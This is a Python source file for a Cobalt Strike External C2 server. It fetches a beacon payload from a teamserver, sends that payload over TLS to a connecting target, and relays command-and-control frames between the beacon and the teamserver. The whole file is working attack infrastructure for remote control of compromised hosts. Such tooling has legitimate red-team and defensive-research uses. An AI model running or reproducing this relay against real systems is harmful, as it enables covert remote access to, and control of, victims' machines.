"""
    server.py

    Program to provide basic TCP communications for Cobalt Strike using the External C2 feature.
"""
import argparse
import base64
import ipaddress
import socket
import struct
import sys
import time
import wolfssl


class TCPinfo:
    """
    @brief Class to hold info for TCP session
    """
    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str, cert, key):
        """

        :param ts_ip: IP address of CS Teamserver
        :param ts_port: Port of CS Teamserver
        :param srv_ip: IP to bind to on server
        :param srv_port: Port of server to listen on
        :param pipe_str: String for named pipe on client
        :param cert: Path to server pem cert
        :param key: Path to server pem key
        """
        if len(pipe_str) > 50:
            raise ValueError('pipe_str must be less than 50 characters')
        self.ts_ip = ts_ip
        self.ts_port = ts_port
        self.srv_ip = srv_ip
        self.srv_port = srv_port
        self.pipe_str = pipe_str
        self.cert = cert
        self.key = key
        

class ExternalC2Controller:
    def __init__(self, port):
        self.port = port

    def encode_frame(self, data):
        """
        
        :param data: data to encode in frame
        :return: data packed in a CS external C2 frame
        """
        return struct.pack("<I", len(data)) + data

    def decode_frame(self, data):
        """
        
        :param data: frame to decode
        :return: length of data and data from frame
        """
        len = struct.unpack("<I", data[0:3])
        body = data[4:]
        return len[0], body

    def send_to_ts(self, data):
        """
        
        :param data: data to send to team server in the form of a CS External C2 frame
        """
        self._socketTS.sendall(self.encode_frame(data))

    def recv_from_ts(self):
        """
        
        :return: data received from team server in the form of a CS External C2 frame
        """
        data = bytearray()
        _len = self._socketTS.recv(4)
        if len(_len) == 0:
            print('connection to ts died. Exiting')
            exit(2)
        frame_length = struct.unpack("<I", _len)[0]
        while len(data) < frame_length:
            data += self._socketTS.recv(frame_length - len(data))
        return data

    def sendToBeacon(self, secure_sock, data):
        """
        
        :param secure_sock: TLS Socket
        :param data: Data to send to beacon
        """
        frame = self.encode_frame(data)
        try:
            secure_sock.sendall(frame)
        except Exception as e:
            print("sendall() in sendToBeacon failed. Error: {}".format(e))
            return -1
        return None


    def recvFromBeacon(self, secure_sock):
        """

        :param secure_sock: TLS Socket
        :return: data received from beacon
        """
        try:
            data_length = secure_sock.recv(4)
        except:
            print("Recv failed.")
            return -1
        if data_length == b'':
            print("Empty data_length")
            return None
        len_tup = struct.unpack("<I", data_length)
        length = len_tup[0]
        # Unpack returns a tuple
        total = 0
        data = b''
        while (total < length):
            try:
                temp = secure_sock.recv(length-total)
            except Exception as e:
                print("Recv data in recvFromBeacon failed. Error: {}".format(e))
                return -1
            total = total + len(temp)
            data = data + temp
        if length != len(data):
            print("WARNING: sent len {} does not equal bytes recv'd {}.".format(length, len(data)))
        return data


    def run(self, tcpinfo, arch):
        """

        :param tcpinfo: Class with user TCP info
        """
        # Connecting to TS first
        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        try:
            self._socketTS.connect((tcpinfo.ts_ip, tcpinfo.ts_port))
        except:
            print("Teamserver connection failed. Exiting.")
            return
        
        # Send out config options
        self.send_to_ts("arch={}".format(arch).encode())
        self.send_to_ts("pipename={}".format(tcpinfo.pipe_str).encode())
        self.send_to_ts("block=500".encode())
        self.send_to_ts("go".encode())

        # Receive the beacon payload from CS to forward to our target
        data = self.recv_from_ts()

        # Now that we have our beacon to send, wait for a connection from our target
        self._socketServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._socketServer.bind((tcpinfo.srv_ip,tcpinfo.srv_port))
        self._socketServer.listen()

        print("cert: {}".format(tcpinfo.cert))
        print("key: {}".format(tcpinfo.key))
        wolfssl.WolfSSL.enable_debug()
        #context = wolfssl.SSLContext(wolfssl.PROTOCOL_TLSv1_2, server_side=True)
        context = wolfssl.SSLContext(wolfssl.PROTOCOL_TLSv1_2, server_side=True)
        context.load_cert_chain(tcpinfo.cert, tcpinfo.key)
        context.verify_mode = wolfssl.CERT_NONE
        secure_sock = None
        print("HERE")

        self._socketBeacon, beacon_addr = self._socketServer.accept()
        print("Connected to : {}".format(beacon_addr))
        secure_sock = context.wrap_socket(self._socketBeacon)
        # Send beacon payload to target
        self.sendToBeacon(secure_sock, data)
        current_beacon_ip = beacon_addr[0]

        while True:

            data = self.recvFromBeacon(secure_sock)
            if data == None:
                '''
                print("Disconnected from beacon, likely due to sleep.")
                secure_sock.close()
                secure_sock = None
                self._socketBeacon, beacon_addr = self._socketServer.accept()
                print("Connected to : {}".format(beacon_addr))
                secure_sock = context.wrap_socket(self._socketBeacon)
                if current_beacon_ip == beacon_addr[0]:
                    continue
                else:
                    print("Error: new connection. Exiting..")
                    break
                '''
                print("Disconnected from beacon. Exiting..")
                break
            elif data == -1:
                print("recvFromBeacon failed. Exiting")
                break
            print("Received {} bytes from beacon and sending to TS".format(len(data)))
            self.send_to_ts(data)

            data = self.recv_from_ts()
            print("Received {} bytes from TS and sending to beacon".format(len(data)))
            if (self.sendToBeacon(secure_sock, data) == -1):
                break
        secure_sock.close()
        self._socketBeacon.close()
        self._socketServer.close()
        self._socketTS.close()


parser = argparse.ArgumentParser(description='Program to provide TCP communications for Cobalt Strike using the External C2 feature.',
                                 usage="\n"
                                       "%(prog)s [TS_IP] [SRV_IP] [SRV_PORT] [PIPE_STR] [CERT] [KEY]"
                                       "\nUse '%(prog)s -h' for more information.")
parser.add_argument('ts_ip', help="IP of teamserver (or redirector).")
parser.add_argument('srv_ip', help="IP to bind to on server.")
parser.add_argument('srv_port', type=int, help="Port number to bind to on server.")
parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client.")
parser.add_argument('cert', help="Path to servers cert. (PEM format)")
parser.add_argument('key', help="Path to servers key. (PEM format)")
parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
parser.add_argument('--restart', '-r', default="N", help="Sleep 10s then restart the server after a disconnect or exit (Y/N). Default is N.")
parser.add_argument('--arch', '-a', choices=['x86', 'x64'], default='x64', type=str, help="Architecture to use for beacon. x86 or x64. Default is x86.")
args = parser.parse_args()
controller = ExternalC2Controller(args.teamserver_port)
tcpinfo = TCPinfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str, args.cert, args.key)
while True:
    if(args.arch == 'x64'):
        print('Ensure client is x64!')
    controller.run(tcpinfo, args.arch)
    if (args.restart == "N"):
        print("Exiting")
        break
    print('waiting 10s before reconnecting to TS')
    time.sleep(10)
